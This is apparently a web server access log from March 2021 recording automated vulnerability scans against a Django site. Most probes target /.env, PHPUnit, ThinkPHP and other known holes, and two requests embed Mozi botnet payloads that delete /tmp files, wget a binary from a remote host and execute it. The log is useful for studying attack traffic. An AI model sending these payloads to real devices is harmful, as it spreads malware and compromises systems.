+[pid: 7|app: 0|req: 44/44] 163.172.70.120 () {40 vars in 619 bytes} [Fri Mar  5 10:34:24 2021] POST / => generated 2994 bytes in 3 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 45/45] 209.17.96.58 () {30 vars in 388 bytes} [Fri Mar  5 11:17:09 2021] GET / => generated 24589 bytes in 9 msecs (HTTP/1.0 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 7|app: 0|req: 46/46] 109.128.59.150 () {36 vars in 512 bytes} [Fri Mar  5 11:24:53 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 47/47] 109.128.59.150 () {40 vars in 619 bytes} [Fri Mar  5 11:24:54 2021] POST / => generated 2994 bytes in 2 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 7|app: 0|req: 48/48] 109.128.59.150 () {38 vars in 648 bytes} [Fri Mar  5 11:24:55 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2540 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /api/jsonws/invoke
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 7|app: 0|req: 50/49] 45.155.205.225 () {38 vars in 598 bytes} [Fri Mar  5 11:53:31 2021] POST /api/jsonws/invoke => generated 2445 bytes in 15 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 50/50] 45.155.205.225 () {38 vars in 700 bytes} [Fri Mar  5 11:53:31 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2544 bytes in 13 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 7|app: 0|req: 51/51] 45.155.205.225 () {36 vars in 612 bytes} [Fri Mar  5 11:53:32 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2543 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /solr/admin/info/system
+[pid: 7|app: 0|req: 52/52] 45.155.205.225 () {34 vars in 544 bytes} [Fri Mar  5 11:53:32 2021] GET /solr/admin/info/system?wt=json => generated 2467 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 7|app: 0|req: 54/53] 45.155.205.225 () {34 vars in 708 bytes} [Fri Mar  5 11:53:32 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 2539 bytes in 13 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 54/54] 45.155.205.225 () {36 vars in 641 bytes} [Fri Mar  5 11:53:32 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 24589 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 55/55] 45.155.205.225 () {34 vars in 544 bytes} [Fri Mar  5 11:53:33 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[pid: 7|app: 0|req: 56/56] 45.155.205.225 () {34 vars in 575 bytes} [Fri Mar  5 11:53:33 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 2528 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /console/
+[pid: 7|app: 0|req: 57/57] 45.155.205.225 () {34 vars in 501 bytes} [Fri Mar  5 11:53:33 2021] GET /console/ => generated 2417 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /Autodiscover/Autodiscover.xml
+[pid: 7|app: 0|req: 58/58] 45.155.205.225 () {38 vars in 624 bytes} [Fri Mar  5 11:53:33 2021] POST /Autodiscover/Autodiscover.xml => generated 2481 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /_ignition/execute-solution
+[pid: 7|app: 0|req: 59/59] 45.155.205.225 () {36 vars in 590 bytes} [Fri Mar  5 11:53:33 2021] GET /_ignition/execute-solution => generated 2471 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 60/60] 81.169.218.28 () {34 vars in 381 bytes} [Fri Mar  5 12:04:26 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 61/61] 209.17.97.2 () {30 vars in 396 bytes} [Fri Mar  5 12:28:50 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /boaform/admin/formLogin
+[pid: 7|app: 0|req: 62/62] 42.224.61.4 () {26 vars in 356 bytes} [Fri Mar  5 12:40:36 2021] GET /boaform/admin/formLogin?username=ec8&psd=ec8 => generated 2482 bytes in 5 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /wp-login.php
+[pid: 7|app: 0|req: 63/63] 18.184.155.204 () {34 vars in 500 bytes} [Fri Mar  5 14:30:17 2021] GET /wp-login.php => generated 2433 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /shell
+[pid: 7|app: 0|req: 64/64] 113.85.98.250 () {34 vars in 629 bytes} [Fri Mar  5 15:02:35 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 2495 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /setup.cgi
+[pid: 7|app: 0|req: 65/65] 122.252.250.22 () {26 vars in 589 bytes} [Fri Mar  5 15:23:30 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://122.252.250.22:57251/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 2581 bytes in 5 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 66/66] 105.159.13.144 () {36 vars in 511 bytes} [Fri Mar  5 15:33:58 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 67/67] 105.159.13.144 () {40 vars in 619 bytes} [Fri Mar  5 15:33:58 2021] POST / => generated 2994 bytes in 3 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /solr/
+[pid: 7|app: 0|req: 68/68] 193.118.53.202 () {34 vars in 486 bytes} [Fri Mar  5 16:28:13 2021] GET /solr/ => generated 2405 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 69/69] 162.142.125.38 () {28 vars in 299 bytes} [Fri Mar  5 16:31:29 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 70/70] 162.142.125.38 () {34 vars in 431 bytes} [Fri Mar  5 16:31:29 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /config/getuser
+[pid: 7|app: 0|req: 71/71] 205.185.122.102 () {40 vars in 661 bytes} [Fri Mar  5 16:52:47 2021] GET /config/getuser?index=0 => generated 2443 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 72/72] 34.65.153.120 () {28 vars in 299 bytes} [Fri Mar  5 17:22:50 2021] OPTIONS / => generated 24589 bytes in 6 msecs (HTTP/1.0 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 73/73] 52.179.10.141 () {36 vars in 511 bytes} [Fri Mar  5 17:47:35 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 74/74] 52.179.10.141 () {40 vars in 618 bytes} [Fri Mar  5 17:47:35 2021] POST / => generated 2994 bytes in 3 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 75/75] 51.13.74.12 () {36 vars in 509 bytes} [Fri Mar  5 17:53:01 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 76/76] 51.13.74.12 () {40 vars in 616 bytes} [Fri Mar  5 17:53:02 2021] POST / => generated 2994 bytes in 2 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 77/77] 45.144.177.140 () {26 vars in 271 bytes} [Fri Mar  5 18:20:46 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.0 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 78/78] 35.187.190.226 () {42 vars in 552 bytes} [Fri Mar  5 18:22:18 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 79/79] 34.125.139.207 () {36 vars in 512 bytes} [Fri Mar  5 18:41:53 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 80/80] 34.125.139.207 () {40 vars in 619 bytes} [Fri Mar  5 18:41:53 2021] POST / => generated 2994 bytes in 2 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /0bef
+[pid: 7|app: 0|req: 81/81] 172.105.89.161 () {26 vars in 280 bytes} [Fri Mar  5 19:26:37 2021] GET /0bef => generated 2400 bytes in 5 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 82/82] 222.118.132.162 () {42 vars in 732 bytes} [Fri Mar  5 20:05:15 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 83/83] 222.118.132.162 () {42 vars in 732 bytes} [Fri Mar  5 20:05:16 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /apple-touch-icon-precomposed.png
+[pid: 7|app: 0|req: 84/84] 222.118.132.162 () {38 vars in 544 bytes} [Fri Mar  5 20:05:18 2021] GET /apple-touch-icon-precomposed.png => generated 2486 bytes in 8 msecs (HTTP/1.1 404) 5 headers in 159 bytes (2 switches on core 0)
+Not Found: /apple-touch-icon.png
+[pid: 7|app: 0|req: 85/85] 222.118.132.162 () {38 vars in 520 bytes} [Fri Mar  5 20:05:18 2021] GET /apple-touch-icon.png => generated 2450 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
